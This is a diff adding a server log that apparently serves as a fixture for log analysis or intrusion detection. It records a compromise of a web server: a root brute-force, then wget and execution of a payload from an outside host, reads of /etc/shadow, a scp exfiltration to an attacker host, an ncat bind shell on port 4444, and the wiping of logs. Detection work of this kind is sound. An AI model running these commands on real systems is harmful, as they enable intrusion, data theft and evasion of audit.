@@ -1,0 +1,54 @@
+Jan 15 08:00:01 webserver01 CRON[1234]: (root) CMD (/usr/lib/apt/apt.systemd.daily)
+Jan 15 08:01:12 webserver01 sshd[2341]: Accepted publickey for admin from 10.0.1.50 port 44221 ssh2
+Jan 15 08:05:33 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=185.220.101.34 DST=10.0.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=244 ID=54321 PROTO=TCP SPT=43567 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+Jan 15 08:05:34 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=185.220.101.34 DST=10.0.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=244 ID=54322 PROTO=TCP SPT=43568 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+Jan 15 08:05:35 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=185.220.101.34 DST=10.0.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=244 ID=54323 PROTO=TCP SPT=43569 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+Jan 15 08:10:22 webserver01 sshd[2455]: Failed password for root from 192.168.1.105 port 55432 ssh2
+Jan 15 08:10:25 webserver01 sshd[2455]: Failed password for root from 192.168.1.105 port 55432 ssh2
+Jan 15 08:10:28 webserver01 sshd[2455]: Failed password for root from 192.168.1.105 port 55432 ssh2
+Jan 15 08:10:31 webserver01 sshd[2456]: Failed password for root from 192.168.1.105 port 55433 ssh2
+Jan 15 08:10:34 webserver01 sshd[2456]: Failed password for root from 192.168.1.105 port 55433 ssh2
+Jan 15 08:10:37 webserver01 sshd[2457]: Accepted password for root from 192.168.1.105 port 55434 ssh2
+Jan 15 08:10:38 webserver01 sshd[2457]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Jan 15 08:11:02 webserver01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+Jan 15 08:12:15 webserver01 root: wget http://194.26.29.110/x86_64 -O /tmp/.cache_update
+Jan 15 08:12:18 webserver01 root: chmod +x /tmp/.cache_update
+Jan 15 08:12:20 webserver01 root: /tmp/.cache_update &
+Jan 15 08:13:01 webserver01 CRON[2501]: (root) CMD (/tmp/.cache_update --silent)
+Jan 15 08:15:44 webserver01 kernel: [UFW ALLOW] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=10.0.1.50 DST=10.0.1.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=80 DPT=44321 WINDOW=14600 RES=0x00 ACK URGP=0
+Jan 15 08:20:00 webserver01 systemd[1]: Started Session 15 of user root.
+Jan 15 08:22:33 webserver01 sshd[2601]: Accepted publickey for deploy from 10.0.1.50 port 44300 ssh2
+Jan 15 08:25:11 webserver01 kernel: TCP: Possible SYN flooding on port 80. Sending cookies.
+Jan 15 08:25:12 webserver01 kernel: TCP: Possible SYN flooding on port 80. Sending cookies.
+Jan 15 08:25:13 webserver01 kernel: TCP: Possible SYN flooding on port 443. Sending cookies.
+Jan 15 08:30:00 webserver01 CRON[2700]: (www-data) CMD (/usr/bin/php /var/www/html/cron.php)
+Jan 15 08:35:22 webserver01 sshd[2801]: Invalid user postgres from 203.0.113.45 port 33210 ssh2
+Jan 15 08:35:23 webserver01 sshd[2801]: Failed password for invalid user postgres from 203.0.113.45 port 33210 ssh2
+Jan 15 08:35:55 webserver01 sshd[2802]: Invalid user oracle from 203.0.113.45 port 33211 ssh2
+Jan 15 08:35:56 webserver01 sshd[2802]: Failed password for invalid user oracle from 203.0.113.45 port 33211 ssh2
+Jan 15 08:36:10 webserver01 sshd[2803]: Invalid user test from 203.0.113.45 port 33212 ssh2
+Jan 15 08:36:11 webserver01 sshd[2803]: Failed password for invalid user test from 203.0.113.45 port 33212 ssh2
+Jan 15 08:40:00 webserver01 systemd[1]: Starting Daily apt download activities...
+Jan 15 08:45:01 webserver01 kernel: Out of memory: Kill process 2501 (cache_update) score 850 or sacrifice child
+Jan 15 08:45:01 webserver01 kernel: Killed process 2501 (cache_update) total-vm:8523456kB, anon-rss:7234567kB
+Jan 15 08:50:22 webserver01 sshd[2901]: Connection from 194.26.29.110 port 44556 on 10.0.1.10 port 22 rdomain ""
+Jan 15 08:50:23 webserver01 sshd[2901]: Accepted publickey for root from 194.26.29.110 port 44556 ssh2
+Jan 15 08:50:24 webserver01 sshd[2901]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Jan 15 08:51:00 webserver01 root: cat /etc/shadow
+Jan 15 08:51:05 webserver01 root: cat /etc/passwd
+Jan 15 08:51:10 webserver01 root: tar czf /tmp/.backup.tar.gz /etc/ /home/ /var/www/
+Jan 15 08:52:00 webserver01 root: scp /tmp/.backup.tar.gz attacker@194.26.29.110:/data/exfil/
+Jan 15 08:55:00 webserver01 CRON[3001]: (root) CMD (/tmp/.cache_update --beacon)
+Jan 15 09:00:01 webserver01 CRON[3100]: (root) CMD (/usr/lib/apt/apt.systemd.daily)
+Jan 15 09:05:00 webserver01 root: iptables -A INPUT -s 10.0.1.0/24 -j ACCEPT
+Jan 15 09:05:01 webserver01 root: iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
+Jan 15 09:06:00 webserver01 root: ncat -lvp 4444 -e /bin/bash
+Jan 15 09:10:33 webserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=45.33.32.156 DST=10.0.1.10 LEN=60 TOS=0x00 PREC=0x00 TTL=50 ID=43210 PROTO=TCP SPT=12345 DPT=4444 WINDOW=29200 RES=0x00 SYN URGP=0
+Jan 15 09:15:00 webserver01 systemd[1]: Stopping OpenBSD Secure Shell server...
+Jan 15 09:15:01 webserver01 systemd[1]: Stopped OpenBSD Secure Shell server.
+Jan 15 09:15:02 webserver01 systemd[1]: Starting OpenBSD Secure Shell server...
+Jan 15 09:15:03 webserver01 systemd[1]: Started OpenBSD Secure Shell server.
+Jan 15 09:20:00 webserver01 root: history -c
+Jan 15 09:20:01 webserver01 root: echo "" > /var/log/auth.log
+Jan 15 09:20:02 webserver01 root: echo "" > /var/log/syslog
+Jan 15 09:25:00 webserver01 logrotate: ALERT: /var/log/syslog truncated outside of normal rotation
